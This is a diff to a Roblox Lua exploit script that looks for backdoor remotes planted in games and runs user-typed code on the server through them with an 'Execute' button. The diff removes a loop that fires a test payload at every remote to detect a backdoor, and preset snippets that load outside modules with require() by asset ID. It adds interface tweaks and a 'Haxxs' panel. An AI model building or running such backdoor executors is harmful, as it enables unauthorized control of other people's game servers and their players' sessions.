@@ -72,11 +72,6 @@ for i,v in pairs(musiclist) do table.insert(musiclistbackup,i) end
 -- strings
 local playerstring = add(game.Players.LocalPlayer.Name,'"')
 
--- script list
-local buttons_injectors = {
-	nosoi = "local nosoi = require(112136724593392) \n nosoi.init(game.Players.".. game.Players.LocalPlayer.Name ..".Character.HumanoidRootPart.Position+Vector3.new(0,38.5,0))",
-	ForsakenFanLercheCharacter = "require(75430638106726).new(".. playerstring ..")",
-}
 
 -- notifaction creator but better??
 function create_withoptions(title,text, duration, btn1, btn2, callback)
@@ -733,7 +728,7 @@ local function gui_create()
 	frame.Size = UDim2.new(0.25,0,0.25,0)
 	frame.BackgroundColor3 = Color3.fromRGB(45,45,45)
 	frame.Position = UDim2.new(0.5,0,0.5,0)
-	frame.AnchorPoint = Vector2.new(0.5,0.5)
+	frame.AnchorPoint = Vector2.new(0,0)
 	frame.Active = true
 	frame.Draggable = true
 	frame.ClipsDescendants = false
@@ -754,6 +749,7 @@ local function gui_create()
 	textbox.TextXAlignment = Enum.TextXAlignment.Left
 	textbox.TextYAlignment = Enum.TextYAlignment.Top
 	textbox.TextSize = 20
+	textbox.MultiLine = true
 	textbox.TextWrapped = true
 	textbox.Size = UDim2.new(1,0,1,0)
 	textbox.AutomaticSize = Enum.AutomaticSize.Y
@@ -775,38 +771,6 @@ local function gui_create()
 		scrollingframe.CanvasSize = UDim2.new(0,0,0,txt.TextBounds.Y+40)
 	end)
 
-	local list = Instance.new("ScrollingFrame",frame)
-	list.Size = UDim2.new(0.25,0,1,0)
-	list.BackgroundTransparency = 0.5
-	list.CanvasSize = UDim2.new(0,0,0,0)
-	list.ScrollBarThickness = 2
-	list.ScrollBarImageColor3 = Color3.fromRGB(255,255,255)
-	list.AnchorPoint = Vector2.new(0.5,0.5)
-	list.Position = UDim2.new(-0.16,0,0.5,0)
-	list.AutomaticCanvasSize = Enum.AutomaticSize.Y
-
-	local uilist = Instance.new("UIListLayout",list)
-	uilist.FillDirection = Enum.FillDirection.Vertical
-	uilist.SortOrder = Enum.SortOrder.LayoutOrder
-
-
-	for i,v in pairs(buttons_injectors) do
-		local textButton = Instance.new("TextButton",list)
-		textButton.Text = i
-		textButton.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
-		textButton.Size = UDim2.new(1,0,0.1,0)
-		textButton.TextColor3 = Color3.fromRGB(255,255,255)
-		textButton.TextScaled = true
-		textButton.AutoButtonColor = true
-		textButton.Name = i
-		textButton.MouseButton1Click:Connect(function()
-			textbox.Text = v
-		end)
-		task.wait()
-	end
-
-
-
 	local textButton = Instance.new("TextButton",frame)
 	textButton.Text = "Execute"
 	textButton.BackgroundColor3 = Color3.fromRGB(37, 65, 38)
@@ -814,7 +778,7 @@ local function gui_create()
 	textButton.TextColor3 = Color3.fromRGB(255,255,255)
 	textButton.Position = UDim2.new(0.015,0,.7+textButton.Size.Y.Scale/2.6,0)
 	textButton.TextScaled = true
-
+	
 	local syntaxenable = Instance.new("TextButton",frame)
 	syntaxenable.Text = "Syntax: T"
 	syntaxenable.BackgroundColor3 = Color3.fromRGB(123, 47, 186)
@@ -836,7 +800,9 @@ local function gui_create()
 
 	textButton.MouseButton1Click:Connect(function()
 		runRemote(r,textbox.Text)
-
+		textButton.Text = "Executed!"
+		task.wait(0.25)
+		textButton.Text = "Execute"
 	end)
 
 	closebutton(frame,plrGui_)
@@ -844,12 +810,24 @@ local function gui_create()
 	local clear = Instance.new("TextButton",frame)
 	clear.Text = "Clear"
 	clear.BackgroundColor3 = Color3.fromRGB(65, 27, 28)
-	clear.Size = UDim2.new(0.35,0,0.2,0)
+	clear.Size = UDim2.new(0.15,0,0.2,0)
 	clear.TextColor3 = Color3.fromRGB(255,255,255)
 	clear.Position = UDim2.new(0.63,0,.7+clear.Size.Y.Scale/2.6,0)
 	clear.TextScaled = true
+	
+	local resize = Instance.new("TextButton",frame)
+	resize.Text = "Resize"
+	resize.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+	resize.Size = UDim2.new(0.15,0,0.2,0)
+	resize.TextColor3 = Color3.fromRGB(255,255,255)
+	resize.Position = UDim2.new(0.83,0,.7+clear.Size.Y.Scale/2.6,0)
+	resize.TextScaled = true
+	
 	clear.MouseButton1Click:Connect(function() 
+		clear.Text = "Cleared!"
 		textbox.Text = ""
+		task.wait(0.25)
+		clear.Text = "Clear"
 	end)
 
 	return plrGui_
@@ -919,6 +897,13 @@ local function getRemotes()
 end;
 
 local function find()
+	local word_generation = ""
+
+	word_generation = alphabet[math.random(1,#alphabet)]
+	for i=1,5 do
+		word_generation=word_generation..tostring(math.random(0,16))
+	end
+	word_generation = tostring(word_generation)
 	local timee=os.clock()
 
 	local finds =  nil
@@ -972,8 +957,9 @@ local function find()
 		end
 		return foundas
 	end
-	local check2 = true
+	local check2 = false
 	task.wait(2)
+
 	if foundas==false then
 		create("Not found c00lspawnn's backdoor remote", "finding LALOL hub's backdoor remote. ".. os.clock()- timee.."s")
 		local remotes={}
@@ -1027,34 +1013,10 @@ local function find()
 
 		check2 = false
 	end
-	task.wait(2)
-	if check2 == false then
-		create("Not Found LALOL's hub backdoor remote.", "Searching for custom backdoors remote.")
-		local remotes_sigma = getRemotes()
 
-		for i, rem in ipairs(remotes_sigma) do
-			if check2 == true then break end;
-			if rem:IsA("RemoteEvent") then
-				rem:FireServer("print('hellbckdr')")
-			elseif rem:IsA("RemoteFunction") then
-				rem:InvokeServer("print('hellbckdr!')")
-			end
-
-			game.LogService.MessageOut:Connect(function(msg)
-				if msg:lower():find('hellbckdr') then
-					create("Backdoor found!", "Backdoor is in control of your game.")
-					check2 = true
-					r = rem
-					return true
-				end
-			end)
-
-		end;
-		
-		return false
-	end
 	
-	return false
+	
+	return check2
 end
 
 -- its obvious
@@ -1093,7 +1055,7 @@ local function gambler()
 	create_guigamble.IgnoreGuiInset = true
 
 	local frame = frame_template(create_guigamble)
-	frame.ClipsDescendants = true
+	frame.ClipsDescendants = false
 
 	local value1, value2, value3
 	local activatorbool = Instance.new("BoolValue")
@@ -1106,7 +1068,7 @@ local function gambler()
 	local function createslot(pos,activator:BoolValue,value,long)
 		task.spawn(function()
 			local gambleframe = Instance.new("Frame",frame)
-			gambleframe.Size = UDim2.new(0.35,0,0.35,0)
+			gambleframe.Size = UDim2.new(0.3,0,0.35,0)
 			gambleframe.ClipsDescendants = true
 			gambleframe.AnchorPoint = Vector2.new(0.5,0.5)
 			gambleframe.Position = UDim2.new(pos,0,0.5,0)	
@@ -1218,9 +1180,9 @@ local function gambler()
 	closebutton(frame,create_guigamble,function()
 		create("oh", "no more gambling???????????????? sadness")
 	end)
-	createslot(0.15,activatorbool,value1,1)
+	createslot(0.2,activatorbool,value1,1)
 	createslot(0.5,activatorbool,value2,2)
-	createslot(0.85,activatorbool,value3,3)
+	createslot(0.8,activatorbool,value3,3)
 
 	local button = Instance.new("TextButton",frame)
 	button.Size = UDim2.new(0.5,0,0.15,0)
@@ -1266,6 +1228,7 @@ local function gambler()
 	
 	bindable.OnInvoke = function()
 		if r then
+			create("Hakari reference", "for the next eternity of this planet, "..game.Players.LocalPlayer.DisplayName.." is now immortal")
 			button:Destroy()
 			local title = Instance.new("TextLabel",frame)
 			title.Size = UDim2.new(1,0,0.1,0)
@@ -1327,6 +1290,23 @@ local function gambler()
 	end)
 end
 
+local function haxxs()
+	local plrGui_ = Instance.new("ScreenGui",interface)
+	plrGui_.ResetOnSpawn = false
+	plrGui_.IgnoreGuiInset = true
+	plrGui_.Name = "farting few"
+
+	local frame = Instance.new("Frame",plrGui_)
+	frame.Size = UDim2.new(0.1,0,0.25,0)
+	frame.BackgroundColor3 = Color3.fromRGB(45,45,45)
+	frame.Position = UDim2.new(0.5,0,0.5,0)
+	frame.AnchorPoint = Vector2.new(0.5,0.5)
+	frame.Active = true
+	frame.Draggable = true
+	frame.Name = "Skibbity"
+	closebutton(frame,plrGui_)
+end
+
 -- yeah bro
 local function createclientsidehub()
 	-- FARTS VERY LOUDLY SO I DONT KNOW
@@ -1344,7 +1324,7 @@ local function createclientsidehub()
 	frame.Active = true
 	frame.Draggable = true
 	frame.Name = "Skibbity"
-
+	closebutton(frame,plrGui_)
 	frame.ClipsDescendants=false
 
 	local imagelabel = Instance.new("ImageLabel",frame)
@@ -1361,7 +1341,7 @@ local function createclientsidehub()
 		imagelabel.Rotation += 0.15
 	end)
 
-	local buttons = {"Music player", "Slots"}
+	local buttons = {"Music player", "Slots", "Haxxs"}
 
 	local scrollingframe = Instance.new("ScrollingFrame",frame)
 	scrollingframe.Size = UDim2.new(1,0,1,0)
@@ -1386,8 +1366,10 @@ local function createclientsidehub()
 		temp.MouseButton1Click:Connect(function()
 			if temp.Text == "Music player" then
 				music_creator()
-			else
+			elseif temp.Text == "Slots" then
 				gambler()
+			else
+				haxxs()
 			end
 		end)
 	end
@@ -1414,7 +1396,11 @@ local function createHandler()
 	task.wait(0.05)
 	local breakwait = false
 	local is_found = find()
+	print(r)
 	if is_found==false then
+		if r then
+			return
+		end
 		task.wait(1)		
 		breakwait = true
 		create_withoptions("No Found", "Sorry! This place is not have backdoor. Sorry! \n (CLIENT SIDE) \n wanna open hub?",5,"Ok!yes","No!!!1",bindable)
